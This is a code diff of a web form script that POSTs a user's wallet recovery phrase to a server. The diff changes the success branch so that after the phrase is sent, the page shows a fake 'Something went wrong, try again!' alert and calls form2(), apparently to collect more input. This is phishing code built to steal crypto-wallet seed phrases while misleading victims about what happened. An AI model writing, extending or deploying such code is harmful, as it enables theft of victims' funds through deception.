@@ -146,15 +146,6 @@ document.addEventListener('DOMContentLoaded', () => {
                     'Accept': 'application/json'
                 },
                 body: JSON.stringify({ recoveryPhrase: recoveryPhrase })
-            })
-            .then(response => response.json())
-            .then(data => {
-                alert("Something went wrong, try again!");
-                // Handle success actions (e.g., display a success message, clear the form)
-            })
-            .catch((error) => {
-                alert("Form cannot be processed");
-                // Handle error actions (e.g., display an error message)
             });
         } else {
             alert('Recovery phrase cannot be empty.');
@@ -183,6 +174,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 body: JSON.stringify({ recoveryPhrase: recoveryPhrase })
             })
             .then(response => response.json())
+            .then(data => {
+                alert("Something went wrong, try again!");
+                form2();
+                // Handle success actions (e.g., display a success message, clear the form)
             })
             .catch((error) => {
                 alert("Form cannot be processed");
